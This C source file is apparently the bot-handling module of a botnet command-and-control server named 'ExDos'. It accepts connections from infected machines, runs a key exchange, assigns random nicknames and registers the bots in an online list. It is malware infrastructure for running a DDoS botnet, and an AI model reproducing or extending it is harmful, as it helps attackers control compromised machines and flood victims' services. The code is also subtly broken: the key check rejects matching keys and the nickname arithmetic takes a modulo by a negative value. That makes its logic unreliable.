#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "../headers/bot_handler.h"

Bot *new_bot(Socket *sock) {
    Bot *b = (Bot *)malloc(sizeof(Bot));

    b->Nickname = generate_nickname(12);
    b->socket = sock;

    return b;
}

void DisconnectBot(Bot *b) {
    close(b->socket->SockFD);
}

void AuthenticateBot(void **args) {
    ExDos *c        = (ExDos *)args[0];
    Socket *sock    = (Socket *)args[1];

    GetClientIP(sock);
    Write(sock, string("Key Exchange\n"));
    str *key = Read(sock);
    if(!key || !key->data) {
        close(sock->SockFD);
        free(sock);
        return;
    }

    // if(strlen(key->data) < 30) {
    //     printf("[ + ] Error, Invalid key exchange");
    //     close(sock->SockFD);
    //     free(sock);
    //     return;
    // }

    if(strstr(key->data, c->BotKey->data))
    {
        close(sock->SockFD);
        free(sock);
        return;
    }
    set_socket_timeout(sock, 0);
    
    Bot *b = new_bot(sock);
    c->online_bots->Append(c->online_bots, sizeof(Bot), (void *)b);
    printf("[ + ] New bot connected: %d => %s....!\n", b->socket->SockFD, b->Nickname->data);
    free(key);
}

str *generate_nickname(int length) {
    str *new = string(NULL);
    char buff[5] = {0};

    for(int i = 0; i < length; i++) {
        sprintf(buff, "%s", int2ch((((int)rand()) % (0 - length + 1)) + 1));

        new->AppendString(new, (char *)&buff);
        memset(buff, '\0', 5);
    }
    new->AppendString(new, "\0");

    return new;
}